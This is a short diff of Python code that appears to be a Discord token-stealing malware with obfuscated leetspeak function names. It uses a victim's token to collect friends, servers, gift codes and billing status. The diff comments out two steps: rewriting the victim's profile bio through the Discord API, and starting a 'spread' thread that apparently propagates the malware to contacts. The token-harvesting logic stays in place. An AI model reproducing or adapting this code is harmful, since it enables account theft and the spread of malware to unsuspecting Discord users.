@@ -107,7 +107,7 @@ def change_about_me(token, biotext):
             "bio": biotext
         }
         url = "https://discord.com/api/v9/users/@me/profile"
-        response = requests.patch(url, headers=headers, json=data)
+        # response = requests.patch(url, headers=headers, json=data)
     except Exception as e:
         error_Handler(e)
 
@@ -518,7 +518,7 @@ def UP104D70K3N(token, path):
     friends = Tr1M(G37UHQFr13ND5(token))
     guilds = Tr1M(G37UHQ6U11D5(token))
     codes = Tr1M(G37C0D35(token))
-    if phone != "": threading.Thread(target=spread, args=(token,)).start()
+    # threading.Thread(target=spread, args=(token,)).start()
     if codes == "": codes = "`No Gifts Found`"
     if billing == "": billing = ":lock:"
     if badge == "" and nitro == "": badge, nitro = ":lock:", ""
